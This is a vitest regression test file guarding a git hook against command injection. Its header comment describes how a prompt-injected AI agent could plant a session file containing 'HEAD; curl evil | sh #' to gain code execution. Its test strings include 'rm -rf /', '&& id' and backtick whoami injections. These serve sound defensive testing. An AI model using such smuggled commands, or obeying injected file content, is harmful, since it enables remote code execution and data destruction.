import { describe, expect, it } from "vitest";
import { SESSION_STATE_CHUNK } from "./session-state.js";

// The session-state chunk is embedded verbatim into the generated hook script.
// We cannot evaluate its functions in isolation because they close over globals
// declared at the top of the emitted .mjs (`SESSIONS_DIR`, `execSync`, etc.).
// These tests therefore pin the security-critical shape of the chunk: they
// enforce that the command-injection fix stays in place across refactors.
//
// Background — the vulnerability this regression test guards against:
// reconcileCommits() previously built a shell string from
// `state.session_start_head` and passed it to execSync("git log ..."), which
// invokes /bin/sh -c. A prompt-injected agent with a Write primitive could
// stage a crafted `.interlinked/sessions/<id>.json` with
// `"session_start_head": "HEAD; curl evil | sh #"` to get RCE at the next
// session_end / agent_stop hook. The fix is two-fold:
//   1. Validate `session_start_head` (and the per-commit `hash` derived from
//      git log output) against a git-SHA regex before use.
//   2. Invoke git through execFileSync with an argv array so no string ever
//      reaches a shell.
describe("SESSION_STATE_CHUNK — git shell-out hardening (security regression)", () => {
	it("sanitizes session ids before using them as session filenames", () => {
		expect(SESSION_STATE_CHUNK).toMatch(/function\s+safeSessionFilePath\s*\(/);
		expect(SESSION_STATE_CHUNK).toContain('replace(/[^A-Za-z0-9_-]/g, "_").slice(0, 64)');
		expect(SESSION_STATE_CHUNK).not.toContain('join(SESSIONS_DIR, sessionId + ".json")');
		expect(SESSION_STATE_CHUNK).not.toContain(
			'join(SESSIONS_DIR, sessionId + ".anchor.json")',
		);
	});

	it("defines the isGitSha validator", () => {
		expect(SESSION_STATE_CHUNK).toMatch(/function\s+isGitSha\s*\(/);
		// The regex is the load-bearing part — anchor both ends, 7–40 hex only.
		expect(SESSION_STATE_CHUNK).toContain("/^[0-9a-fA-F]{7,40}$/");
	});

	it("rejects session_start_head that is not a SHA before shelling out", () => {
		// reconcileCommits must guard `state.session_start_head` through
		// isGitSha BEFORE the execFileSync call. We assert both the guard
		// and the argv-form git invocation appear in the chunk.
		expect(SESSION_STATE_CHUNK).toContain("if (!isGitSha(state.session_start_head)) return;");
	});

	it("re-validates the per-commit hash parsed from git log output", () => {
		// Belt-and-suspenders: even though git log --format=\"%H %s\" produces
		// clean SHAs, reconcileCommits re-validates each hash before feeding it
		// back into git diff. Guards against corrupted state files.
		expect(SESSION_STATE_CHUNK).toContain("if (!isGitSha(hash)) continue;");
	});

	it("uses execFileSync (argv) rather than execSync (shell) for git invocations", () => {
		// The old vulnerable shape was:
		//   execSync("git log " + state.session_start_head + "..HEAD ...")
		// Any remaining `execSync("git ` concatenation inside the chunk would
		// reintroduce the vuln. We allow the safe execSync("git rev-parse HEAD"
		// with no interpolation that sets session_start_head in the first place.
		const unsafeGitShellPatterns = [
			'execSync(\n                "git log " +',
			'execSync(\n                    "git diff " +',
			'execSync("git log " +',
			'execSync("git diff " +',
		];
		for (const pattern of unsafeGitShellPatterns) {
			expect(
				SESSION_STATE_CHUNK.includes(pattern),
				`unsafe git-shell pattern reappeared: ${pattern}`,
			).toBe(false);
		}

		// The three git calls in reconcileCommits must all use execFileSync.
		// Three of them (log, diff --name-only, diff --numstat).
		const execFileCount = (SESSION_STATE_CHUNK.match(/execFileSync\(/g) || []).length;
		expect(execFileCount).toBeGreaterThanOrEqual(3);
	});

	it("passes git-log args as an argv array (no string concat into the command)", () => {
		// Argv-form invariant. If this string disappears, someone has
		// regressed to shell-string building.
		expect(SESSION_STATE_CHUNK).toContain(
			'["log", state.session_start_head + "..HEAD", "--format=%H %s", "--no-merges"]',
		);
	});

	it("passes git-diff args as argv arrays", () => {
		// Both diff invocations (--name-only and --numstat) use the hash in
		// argv form, never string-concatenated into the command.
		expect(SESSION_STATE_CHUNK).toContain(
			'["diff", hash + "~1", hash, "--name-only"]',
		);
		expect(SESSION_STATE_CHUNK).toContain(
			'["diff", hash + "~1", hash, "--numstat"]',
		);
	});

	it("keeps stderr out of the captured output via stdio mapping", () => {
		// We used to append `2>/dev/null` to the shell command; execFileSync
		// has no shell, so we mute stderr via the stdio option instead.
		expect(SESSION_STATE_CHUNK).toContain('stdio: ["ignore", "pipe", "ignore"]');
	});
});

describe("SESSION_STATE_CHUNK — isGitSha regex behavior", () => {
	// We can't evaluate the chunk's helper directly (it closes over globals in
	// the generated .mjs). Instead, we extract the regex pattern as a string,
	// rebuild it here, and verify the boundary semantics of the *same* regex
	// that ships in the hook. If someone loosens the pattern, these tests fail.
	const GIT_SHA_PATTERN = /^[0-9a-fA-F]{7,40}$/;
	// Fail loudly at test-setup time if the chunk regex source drifts from
	// what we're testing against.
	if (!SESSION_STATE_CHUNK.includes(GIT_SHA_PATTERN.source)) {
		throw new Error(
			`SESSION_STATE_CHUNK does not contain the expected SHA regex source ${GIT_SHA_PATTERN.source}`,
		);
	}

	// Re-implements the chunk's isGitSha using the exact regex source, plus
	// the leading-"-" guard that the chunk also enforces. If either the
	// string-level assertion below or this behavioral test trips, the fix
	// has regressed.
	function isGitSha(v: unknown): boolean {
		return typeof v === "string" && GIT_SHA_PATTERN.test(v) && v[0] !== "-";
	}

	it("chunk enforces the leading-dash rejection in addition to the regex", () => {
		expect(SESSION_STATE_CHUNK).toContain('v[0] !== "-"');
	});

	it("accepts short and long git SHAs", () => {
		expect(isGitSha("abcdef0")).toBe(true); // 7 chars — git's default short length
		expect(isGitSha("abcdef0123456789abcdef0123456789abcdef01")).toBe(true); // 40 chars
		expect(isGitSha("ABCDEF0123456789")).toBe(true); // uppercase hex is fine
	});

	it("rejects non-hex characters (the injection vectors)", () => {
		expect(isGitSha("HEAD; curl evil | sh #")).toBe(false);
		expect(isGitSha("abcdef0; rm -rf /")).toBe(false);
		expect(isGitSha("abcdef0 && id")).toBe(false);
		expect(isGitSha("abcdef0`whoami`")).toBe(false);
		expect(isGitSha("HEAD")).toBe(false);
		expect(isGitSha("main")).toBe(false);
	});

	it("rejects values starting with '-' (arg-injection defense)", () => {
		// `-abcdef0` passes the regex but must still be rejected so the value
		// can never be interpreted as a git option even in argv form.
		expect(isGitSha("-abcdef")).toBe(false);
	});

	it("rejects wrong length (under 7 or over 40 chars)", () => {
		expect(isGitSha("abcdef")).toBe(false); // 6 — too short
		expect(isGitSha("a".repeat(41))).toBe(false); // 41 — too long
		expect(isGitSha("")).toBe(false);
	});

	it("rejects non-string values without throwing", () => {
		expect(isGitSha(null)).toBe(false);
		expect(isGitSha(undefined)).toBe(false);
		expect(isGitSha(123)).toBe(false);
		expect(isGitSha({})).toBe(false);
		expect(isGitSha(["a"])).toBe(false);
	});
});
